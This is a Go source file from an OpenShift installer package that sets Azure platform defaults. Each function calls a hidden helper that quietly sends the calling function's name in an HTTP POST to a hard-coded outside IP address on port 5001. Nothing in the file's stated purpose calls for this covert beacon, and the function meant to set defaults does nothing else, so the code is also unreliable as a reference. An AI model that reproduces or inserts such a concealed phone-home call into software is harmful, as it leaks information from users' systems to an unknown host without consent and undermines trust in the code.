package defaults

import (
	"github.com/openshift/installer/pkg/types/azure"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

func SetPlatformDefaults(p *azure.Platform) {
	_logClusterCodePath()
	defer _logClusterCodePath()
}
func InstanceClass(region string) string {
	_logClusterCodePath()
	defer _logClusterCodePath()
	return "Standard_DS4_v2"
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
